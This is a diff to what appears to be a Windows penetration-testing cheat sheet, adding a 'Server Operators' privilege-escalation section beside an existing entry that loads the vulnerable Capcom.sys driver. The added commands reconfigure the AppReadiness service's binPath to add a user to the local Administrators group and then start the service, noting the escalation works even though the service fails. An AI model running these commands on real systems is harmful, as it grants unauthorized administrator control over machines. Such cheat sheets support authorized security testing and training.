@@ -2613,6 +2613,17 @@ https://github.com/TarlogicSecurity/EoPLoadDriver/
 C:\> EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys
 ```
 
+- Server Operators
+
+```
+C:\> sc qc AppReadiness
+https://learn.microsoft.com/en-us/sysinternals/downloads/psservice
+C:\> PsService.exe security AppReadiness
+C:\> sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+C:\> sc start AppReadiness
+# If we check the membership of the administrators group, we see that the command was executed successfully, despite the service failing to start
+```
+
 #6. - Persistence
 -----------------------------------------
 
